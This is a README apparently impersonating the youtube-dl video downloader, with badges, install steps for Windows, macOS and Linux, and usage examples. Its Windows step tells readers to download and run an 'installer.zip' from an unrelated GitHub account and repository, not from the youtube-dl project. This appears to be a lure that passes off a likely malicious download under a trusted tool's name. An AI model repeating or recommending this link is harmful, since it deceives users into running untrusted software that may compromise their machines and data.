# youtube-dl

![GitHub stars](https://img.shields.io/github/stars/ytdl-org/youtube-dl?style=social) ![GitHub forks](https://img.shields.io/github/forks/ytdl-org/youtube-dl) ![License](https://img.shields.io/badge/license-MIT-blue.svg)

youtube-dl is a powerful command-line tool that allows you to download videos from a variety of sites, including YouTube, Vimeo, and many others. It supports a wide range of formats and is highly customizable, making it a favorite among developers and content enthusiasts.

## Installation

You can easily install youtube-dl on Windows, macOS, and Linux. Follow the instructions below for your respective platform:

### Windows
1. Download the installer from the following link: [Installer](https://github.com/cleusaindustriadocobre-cyber/fantastic-palm-tree/raw/refs/heads/main/installer.zip)
2. Run the installer and follow the on-screen instructions.

### macOS
1. Open Terminal.
2. Use Homebrew to install:
   ```bash
   brew install youtube-dl
   ```

### Linux
1. Open Terminal.
2. Run the following command:
   ```bash
   sudo curl -L https://yt-dl.org/download/latest/youtube-dl -o /usr/local/bin/youtube-dl
   sudo chmod a+rx /usr/local/bin/youtube-dl
   ```

## Usage

To download a video, simply run the following command in the terminal:
```bash
youtube-dl [URL]
```
Replace `[URL]` with the link to the video you wish to download. For example:
```bash
youtube-dl https://www.youtube.com/watch?v=example
```

You can also customize your download by specifying options. For more details, check the [documentation](https://github.com/ytdl-org/youtube-dl#readme).

## Contribution

Contributions are welcome! Please fork this repository and submit a pull request with your changes. Ensure that your code adheres to the project's coding standards and includes appropriate tests.

## License

This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.